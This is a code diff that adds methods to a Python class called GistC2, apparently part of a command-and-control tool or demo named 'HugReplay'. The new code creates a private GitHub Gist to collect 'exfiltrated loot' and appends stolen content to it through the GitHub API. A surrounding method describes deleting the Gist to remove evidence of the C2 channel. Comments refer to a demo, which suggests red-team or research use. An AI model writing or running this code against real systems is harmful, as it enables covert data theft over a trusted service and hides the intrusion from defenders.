@@ -91,6 +91,53 @@ class GistC2:
         print(f"[C2] Migrated: {old_id} → {new_id}")
         return new_id
 
+    def create_loot_gist(self, session_id: str) -> str:
+        """
+        Create a separate private Gist to accumulate exfiltrated loot.
+        NOT auto-deleted — operator reviews and deletes manually after demo.
+        Returns the Gist URL.
+        """
+        resp = requests.post(
+            f"{self.GITHUB_API}/gists",
+            headers=self.headers,
+            json={
+                "public": False,
+                "description": f"HugReplay loot — session {session_id}",
+                "files": {
+                    "loot.txt": {"content": f"# HugReplay Session {session_id}\n# Delete this Gist after demo\n\n"}
+                },
+            },
+            timeout=10,
+        )
+        resp.raise_for_status()
+        self.loot_gist_id = resp.json()["id"]
+        url = f"https://gist.github.com/{self.loot_gist_id}"
+        print(f"[C2] Loot Gist created: {url}")
+        return url
+
+    def append_loot(self, content: str) -> None:
+        """Append exfiltrated content to the loot Gist."""
+        if not hasattr(self, "loot_gist_id") or not self.loot_gist_id:
+            return
+        try:
+            # Read current content
+            resp = requests.get(
+                f"{self.GITHUB_API}/gists/{self.loot_gist_id}",
+                headers=self.headers, timeout=10,
+            )
+            resp.raise_for_status()
+            current = resp.json()["files"]["loot.txt"]["content"]
+            updated = current + content
+            requests.patch(
+                f"{self.GITHUB_API}/gists/{self.loot_gist_id}",
+                headers=self.headers,
+                json={"files": {"loot.txt": {"content": updated}}},
+                timeout=10,
+            )
+            print(f"[C2] Loot updated ({len(content)} chars)")
+        except Exception as e:
+            print(f"[C2] Warning: failed to update loot Gist: {e}")
+
     def delete_channel(self) -> None:
         """Delete Gist — self-cleaning, removes evidence of C2 channel."""
         if not self.gist_id:
